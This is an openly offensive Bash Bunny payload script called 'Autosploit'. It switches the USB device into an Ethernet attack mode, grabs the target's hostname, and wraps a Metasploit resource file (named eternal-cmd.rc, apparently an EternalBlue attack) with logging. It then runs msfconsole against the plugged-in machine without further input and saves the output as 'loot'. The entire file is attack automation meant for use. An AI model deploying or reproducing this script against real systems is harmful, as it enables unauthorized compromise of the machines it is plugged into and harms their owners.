#!/bin/bash
#
# Title:         Autosploit for Bash Bunny
# Author:        PunkLobster
# Version:       0.1
#
# Starts Metasploit Script.
# Wraps the Metasploit script to send output to the loot log fie.
# Also adds a 'quit' to the end so the blocking call can end and allow us to change the LED.
#
# Red ...........Setup
# Amber..........Running
# Green..........Finished
#

# Change this for the desired Metasploit script
RC=/root/udisk/payloads/$SWITCH_POSITION/eternal-cmd.rc

LOOTDIR=/root/udisk/loot/autosploit
# location of the patched script 
PATCHED_RC=$LOOTDIR/patched.rc



######## INITIALIZATION ########
LED SETUP 
# Use RNDIS for Windows. Mac/*nix use ECM_ETHERNET
#ATTACKMODE RNDIS_ETHERNET 
ATTACKMODE ECM_ETHERNET
GET TARGET_HOSTNAME



######## PREPARE rvm ########
export HOME=/root/
source /root/.bashrc



######## MAKE LOOT DIRECTORY ########
# Setup named logs in loot directory
mkdir -p $LOOTDIR
HOST=${TARGET_HOSTNAME}
# If hostname is blank set it to "noname"
[[ -z "$HOST" ]] && HOST="noname"
COUNT=$(ls -lad $LOOTDIR/$HOST*.log | wc -l)
COUNT=$((COUNT+1))
# Start the timer for the log file (can't rely on absolute system time, so relative from script start)
START_TIME=$SECONDS
LOGFILE=$LOOTDIR/$HOST-$COUNT.log



######## FUNCTIONS ########
function logit {
	echo "$(($SECONDS - $START_TIME))s: ${1}" >> $LOGFILE
}



######## PATCH RC FILE FOR LOGGING ########
echo "spool $LOGFILE" > $PATCHED_RC
cat $RC >> $PATCHED_RC
echo "spool off" >> $PATCHED_RC
echo "quit" >> $PATCHED_RC



######## ATTACK ########
LED ATTACK
logit "Starting"
/root/metasploit-framework/msfconsole -r $PATCHED_RC
# if script isn't running, use the redirection below to see msfconsole errors (will duplicate successful script line output though)
# >> $LOGFILE 2>&1
logit "Finishing"



######## CLEANUP ########
LED CLEANUP
sync



######## FINISH ########
LED FINISH
